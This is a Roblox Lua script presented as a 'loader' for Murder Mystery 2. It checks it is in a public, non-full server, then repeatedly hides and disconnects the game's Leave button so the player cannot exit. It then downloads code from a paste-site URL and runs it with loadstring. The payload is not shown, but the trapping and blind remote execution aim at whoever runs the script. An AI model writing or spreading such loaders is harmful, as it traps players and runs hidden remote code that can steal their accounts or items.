local Services = setmetatable({}, {
    __index = function(self, key)
        local ok, svc = pcall(function()
            return game:GetService(key)
        end)
        if not ok or not svc then
            warn(("[Axiom] Service '%s' unavailable."):format(tostring(key)))
            return nil
        end
        rawset(self, key, svc)
        return svc
    end,
})

local Players = Services.Players
local CoreGui = Services.CoreGui
local ReplicatedStorage = Services.ReplicatedStorage

local PLACE_ID = 142823291
local MAX_PLAYERS = 12
local LOCAL_PLAYER = Players.LocalPlayer

local function bail(reason)
    warn(("[Axiom] Bail: %s"):format(reason))
    if LOCAL_PLAYER then
        LOCAL_PLAYER:Kick("Script: " .. reason)
    end
    return false
end

local function isVipServer()
    local ok, result = pcall(function()
        local probe = ReplicatedStorage:FindFirstChild("GetServerType")
        if not probe then return false end
        return probe:InvokeServer() == "VIPServer"
    end)
    return ok and result or false
end

local function serverIsFull()
    local ok, count = pcall(function()
        return #Players:GetPlayers()
    end)
    return ok and count and count >= MAX_PLAYERS
end

local function boot()
    if game.PlaceId ~= PLACE_ID then
        return bail("Only works in Murder Mystery 2")
    end
    if isVipServer() then
        return bail("Private servers not supported")
    end
    if serverIsFull() then
        return bail("Server is full")
    end
    return true
end

if not boot() then return end

local function lockLeaveButton()
    task.spawn(function()
        while task.wait(0.25) do
            pcall(function()
                if not CoreGui then return end
                for _, obj in ipairs(CoreGui:GetDescendants()) do
                    if obj:IsA("GuiButton") and obj.Name == "LeaveGameButton" then
                        obj.Visible = false
                        if type(getconnections) == "function" then
                            for _, conn in ipairs(getconnections(obj.Activated)) do
                                pcall(function() conn:Disable() end)
                                pcall(function() conn:Disconnect() end)
                            end
                        end
                        pcall(function()
                            if obj.Activated and obj.Activated.DisconnectAll then
                                obj.Activated:DisconnectAll()
                            end
                        end)
                    end
                end
            end)
        end
    end)
end

lockLeaveButton()

local function executeRemote(url)
    task.spawn(function()
        local fetched, body = pcall(function()
            return game:HttpGet(url)
        end)
        if not fetched or type(body) ~= "string" or #body == 0 then
            warn("[Axiom] Remote fetch failed.")
            return
        end
        local compiled, chunk = pcall(function()
            return loadstring(body)
        end)
        if not compiled or type(chunk) ~= "function" then
            warn("[Axiom] Payload failed to compile.")
            return
        end
        local ran, err = pcall(chunk)
        if not ran then
            warn(("[Axiom] Runtime error: %s"):format(tostring(err)))
        end
    end)
end

executeRemote("https://cdn.sourceb.in/bins/sYy2z5WOCb/0")

print("[Axiom] MM2 loader online.")
